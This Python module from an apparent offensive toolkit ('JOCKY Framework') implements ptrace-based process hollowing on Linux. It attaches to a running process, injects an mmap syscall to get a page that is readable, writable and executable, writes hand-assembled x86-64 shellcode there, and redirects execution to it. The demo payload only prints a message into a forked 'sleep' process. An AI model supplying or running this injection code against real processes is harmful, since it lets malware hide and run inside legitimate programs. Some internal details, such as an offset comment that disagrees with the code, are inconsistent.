"""
JOCKY Framework — Module 12: ptrace-Based Process Hollowing (Linux)

Full implementation with mmap injection:
  1. Attach to target process
  2. Save original registers
  3. Use target's own mmap syscall to allocate an RWX page
  4. Write shellcode to that page
  5. Redirect RIP, let shellcode run, trap on int3
  6. Restore state, detach

The Linux equivalent of Windows VirtualAllocEx + WriteProcessMemory +
SetThreadContext, done entirely via ptrace(2).
"""

import ctypes
import os
import signal
import struct
import sys
import time
from pathlib import Path


# ptrace requests
PTRACE_TRACEME   = 0
PTRACE_PEEKDATA  = 2
PTRACE_POKEDATA  = 5
PTRACE_GETREGS   = 12
PTRACE_SETREGS   = 13
PTRACE_CONT      = 7
PTRACE_ATTACH    = 16
PTRACE_DETACH    = 17
PTRACE_SINGLESTEP = 9

# x86-64 syscalls
SYS_mmap = 9

# mmap constants
PROT_READ  = 0x1
PROT_WRITE = 0x2
PROT_EXEC  = 0x4
MAP_PRIVATE = 0x02
MAP_ANONYMOUS = 0x20

# Registers layout for x86-64 user_regs_struct (27 x u64)
REG_NAMES = [
    "r15", "r14", "r13", "r12", "rbp", "rbx",
    "r11", "r10", "r9", "r8", "rax", "rcx",
    "rdx", "rsi", "rdi", "orig_rax", "rip", "cs",
    "eflags", "rsp", "ss", "fs_base", "gs_base",
    "ds", "es", "fs", "gs",
]
REGS_FMT = "Q" * 27
REGS_SIZE = struct.calcsize(REGS_FMT)

libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.ptrace.restype = ctypes.c_long


def ptrace(request, pid, addr=0, data=0):
    ret = libc.ptrace(
        ctypes.c_ulong(request),
        ctypes.c_long(pid),
        ctypes.c_void_p(addr),
        ctypes.c_void_p(data),
    )
    return int(ret)


def get_regs(pid):
    buf = ctypes.create_string_buffer(REGS_SIZE)
    ret = libc.ptrace(
        ctypes.c_ulong(PTRACE_GETREGS), ctypes.c_long(pid),
        ctypes.c_void_p(0), ctypes.cast(buf, ctypes.c_void_p),
    )
    if ret < 0:
        err = ctypes.get_errno()
        raise OSError(err, f"GETREGS: {os.strerror(err)}")
    return dict(zip(REG_NAMES, struct.unpack(REGS_FMT, buf.raw)))


def set_regs(pid, regs):
    values = [regs[n] for n in REG_NAMES]
    buf = ctypes.create_string_buffer(struct.pack(REGS_FMT, *values))
    ret = libc.ptrace(
        ctypes.c_ulong(PTRACE_SETREGS), ctypes.c_long(pid),
        ctypes.c_void_p(0), ctypes.cast(buf, ctypes.c_void_p),
    )
    if ret < 0:
        err = ctypes.get_errno()
        raise OSError(err, f"SETREGS: {os.strerror(err)}")


def peek_word(pid, addr):
    ret = ptrace(PTRACE_PEEKDATA, pid, addr, 0)
    if ret == -1:
        err = ctypes.get_errno()
        if err != 0:
            raise OSError(err, f"PEEKDATA at {hex(addr)}")
    return ret & 0xFFFFFFFFFFFFFFFF


def poke_word(pid, addr, value):
    ret = ptrace(PTRACE_POKEDATA, pid, addr, value)
    if ret < 0:
        err = ctypes.get_errno()
        raise OSError(err, f"POKEDATA at {hex(addr)}")


def write_bytes(pid, addr, data):
    """Write bytes 8 at a time, reading-modifying-writing the tail."""
    n = len(data)
    i = 0
    while i < n:
        chunk = data[i:i+8]
        if len(chunk) == 8:
            word = struct.unpack("<Q", chunk)[0]
        else:
            # Preserve the existing tail bytes
            existing = peek_word(pid, addr + i)
            mask = (1 << (len(chunk) * 8)) - 1
            word = (existing & ~mask) | struct.unpack("<Q", chunk.ljust(8, b"\x00"))[0]
        poke_word(pid, addr + i, word)
        i += 8


def find_syscall_gadget(pid):
    """
    Find a `syscall; ret` (0f 05 c3) or `syscall` (0f 05) instruction in the
    target's executable memory. Prefer vDSO for stability.
    """
    # vDSO is at a stable address in most Linux processes
    maps_path = f"/proc/{pid}/maps"
    candidates = []
    try:
        with open(maps_path) as f:
            for line in f:
                parts = line.split()
                if len(parts) < 2:
                    continue
                perms = parts[1]
                if "x" not in perms:
                    continue
                addr_range = parts[0]
                start_hex, end_hex = addr_range.split("-")
                start = int(start_hex, 16)
                end = int(end_hex, 16)
                # Prioritize vdso
                name = parts[-1] if len(parts) >= 6 else ""
                if "[vdso]" in line:
                    candidates.insert(0, (start, end))
                else:
                    candidates.append((start, end))
    except (FileNotFoundError, PermissionError):
        return None

    for start, end in candidates:
        # Scan for 0f 05 (syscall). Skip pages that are huge.
        scan_end = min(end, start + 0x10000)
        addr = start
        while addr < scan_end - 2:
            try:
                word = peek_word(pid, addr)
            except OSError:
                addr += 8
                continue
            # Look for 0f 05 at any byte offset in this word
            for off in range(8):
                if addr + off + 2 > scan_end:
                    break
                b0 = (word >> (off * 8)) & 0xFF
                b1 = (word >> ((off + 1) * 8)) & 0xFF
                if b0 == 0x0F and b1 == 0x05:
                    return addr + off
            addr += 8
    return None


# x86-64 shellcode that writes to stdout and traps.
def build_shellcode(message: bytes) -> bytes:
    msg_len = len(message)
    code = bytearray()
    # mov rax, 1
    code += b"\x48\xc7\xc0\x01\x00\x00\x00"
    # mov rdi, 1
    code += b"\x48\xc7\xc7\x01\x00\x00\x00"
    # lea rsi, [rip+disp32] -- patched below
    code += b"\x48\x8d\x35\x00\x00\x00\x00"
    # mov rdx, msg_len
    code += b"\x48\xc7\xc2" + struct.pack("<I", msg_len)
    # syscall
    code += b"\x0f\x05"
    # int3
    code += b"\xcc"

    # Patch lea disp32
    lea_disp_offset = 14 + 3
    after_lea = 21
    msg_offset = len(code)
    struct.pack_into("<i", code, lea_disp_offset, msg_offset - after_lea)

    code += message
    code += b"\x00"
    return bytes(code)


def single_step_until_after_syscall(pid, timeout=2.0):
    """
    Single-step the target until it has finished the syscall.
    After a syscall returns, RAX holds the result. We stop just after.
    """
    # Step once — the syscall executes, then we stop right after
    ptrace(PTRACE_SINGLESTEP, pid, 0, 0)
    _, status = os.waitpid(pid, 0)
    if os.WIFEXITED(status):
        return False
    if os.WIFSTOPPED(status):
        sig = os.WSTOPSIG(status)
        # SIGTRAP is expected
        if sig == signal.SIGTRAP:
            return True
        if sig in (signal.SIGSEGV, signal.SIGILL):
            return False
    return False


def process_hollow_mmap(pid, payload, verbose=True):
    """
    Full process hollowing:
      Phase 1: Inject mmap syscall to get a fresh RWX page.
      Phase 2: Write shellcode to that page and execute.
      Phase 3: Restore and detach.
    """
    try:
        if verbose:
            print(f"[hollow] PTRACE_ATTACH → {pid}")
        if ptrace(PTRACE_ATTACH, pid) < 0:
            raise OSError("PTRACE_ATTACH failed")

        # Wait for attach stop
        os.waitpid(pid, 0)

        # Save original registers
        orig = get_regs(pid)
        if verbose:
            print(f"[hollow] Original RIP = {hex(orig['rip'])}  RSP = {hex(orig['rsp'])}")

        # Find a syscall gadget
        syscall_addr = find_syscall_gadget(pid)
        if syscall_addr is None:
            raise RuntimeError("no syscall gadget found in target")
        if verbose:
            print(f"[hollow] syscall gadget at {hex(syscall_addr)}")

        # ---------- PHASE 1: mmap injection ----------
        regs = dict(orig)
        regs["rax"] = SYS_mmap
        regs["rdi"] = 0                    # addr = NULL, kernel chooses
        regs["rsi"] = 0x1000               # size = 4096
        regs["rdx"] = PROT_READ | PROT_WRITE | PROT_EXEC   # RWX
        regs["r10"] = MAP_PRIVATE | MAP_ANONYMOUS
        regs["r8"]  = 0xFFFFFFFFFFFFFFFF   # fd = -1
        regs["r9"]  = 0                    # offset
        regs["rip"] = syscall_addr

        if verbose:
            print(f"[hollow] PHASE 1: injecting mmap(RWX) via syscall gadget")

        set_regs(pid, regs)
        ptrace(PTRACE_SINGLESTEP, pid, 0, 0)
        os.waitpid(pid, 0)

        # Read RAX = new RWX page address
        regs_after = get_regs(pid)
        rwx_page = regs_after["rax"]
        if verbose:
            print(f"[hollow] PHASE 1: mmap returned {hex(rwx_page)}")

        if rwx_page > 0x7FFFFFFFFFFF or rwx_page == 0:
            raise RuntimeError(f"mmap failed, RAX = {hex(rwx_page)}")

        # ---------- PHASE 2: write shellcode to RWX page ----------
        if verbose:
            print(f"[hollow] PHASE 2: writing {len(payload)} bytes to {hex(rwx_page)}")

        write_bytes(pid, rwx_page, payload)

        # Redirect RIP to shellcode, restore other registers.
        # The syscall instruction internally uses RCX (saved RIP+2) and R11
        # (saved RFLAGS). Set them to sane values so the kernel's sysret
        # returns to the right place if the syscall instruction is single-stepped.
        regs2 = dict(orig)
        regs2["rip"] = rwx_page
        regs2["rcx"] = rwx_page + 30  # address right after `syscall` (offset 28)
        regs2["r11"] = orig["eflags"]
        set_regs(pid, regs2)

        if verbose:
            check = get_regs(pid)
            print(f"[hollow] VERIFY after set_regs: RIP={hex(check['rip'])}  (expected {hex(rwx_page)})")
        if verbose:
            print(f"[hollow] PHASE 2: RIP -> {hex(rwx_page)}")

        ptrace(PTRACE_CONT, pid, 0, 0)
        _, status = os.waitpid(pid, 0)

        if os.WIFSTOPPED(status):
            sig = os.WSTOPSIG(status)
            if verbose:
                print(f"[hollow] Payload returned — signal {sig}")

            # Get the siginfo to see the fault address
            if sig == signal.SIGSEGV:
                class siginfo_t(ctypes.Structure):
                    _fields_ = [
                        ("si_signo", ctypes.c_int),
                        ("si_errno", ctypes.c_int),
                        ("si_code", ctypes.c_int),
                        ("_pad", ctypes.c_int),
                        ("si_addr", ctypes.c_void_p),
                    ]
                info = siginfo_t()
                ret = libc.ptrace(
                    ctypes.c_ulong(0x4202),  # PTRACE_GETSIGINFO
                    ctypes.c_long(pid),
                    ctypes.c_void_p(0),
                    ctypes.cast(ctypes.byref(info), ctypes.c_void_p),
                )
                if ret >= 0:
                    print(f"[hollow]   si_code = {info.si_code}  fault_addr = {hex(info.si_addr or 0)}")
                    # si_code meanings: 1=MAPERR, 2=ACCERR, 128=KERNEL, ...
                    code_map = {1: "SEGV_MAPERR (address not mapped)",
                                2: "SEGV_ACCERR (permission denied)",
                                128: "SI_KERNEL (kernel-generated)"}
                    print(f"[hollow]   {code_map.get(info.si_code, 'unknown')}")

                # Also dump the current registers
                r = get_regs(pid)
                print(f"[hollow]   RIP={hex(r['rip'])}  RSP={hex(r['rsp'])}  RAX={hex(r['rax'])}  RCX={hex(r['rcx'])}")
                print(f"[hollow]   RDI={hex(r['rdi'])}  RSI={hex(r['rsi'])}  RDX={hex(r['rdx'])}")
        # ---------- PHASE 3: restore ----------
        if verbose:
            print(f"[hollow] PHASE 3: restoring original registers")

        try:
            set_regs(pid, orig)
            ptrace(PTRACE_DETACH, pid, 0, 0)
        except OSError:
            pass

        return True

    except Exception as e:
        if verbose:
            print(f"[hollow] ERROR: {e}")
        try:
            ptrace(PTRACE_DETACH, pid, 0, 0)
        except OSError:
            pass
        return False


# ---------- Demo ----------
def demo():
    print("=" * 70)
    print("JOCKY ptrace Process Hollowing — mmap Injection Edition")
    print("=" * 70)

    marker = b"[INJECTED] JOCKY shellcode executed inside the target process!\n"
    payload = build_shellcode(marker)

    print(f"[demo] Payload size: {len(payload)} bytes")
    print()

    pid = os.fork()
    if pid == 0:
        os.execvp("sleep", ["sleep", "30"])
        os._exit(127)

    time.sleep(0.3)
    print(f"[demo] Target PID: {pid}  (sleep 30)")
    print()

    ok = process_hollow_mmap(pid, payload)

    print()
    if ok:
        print("[demo] ✓ Process hollowing complete")
    else:
        print("[demo] ✗ Process hollowing failed")

    try:
        os.kill(pid, signal.SIGKILL)
    except ProcessLookupError:
        pass


if __name__ == "__main__":
    demo()
